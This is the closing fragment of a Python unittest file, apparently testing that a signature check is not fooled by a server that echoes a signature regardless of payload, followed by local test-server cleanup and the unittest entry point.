                             "a signature echoed regardless of payload must not confirm")
        finally:
            server.shutdown()
            server.server_close()


if __name__ == "__main__":
    unittest.main()
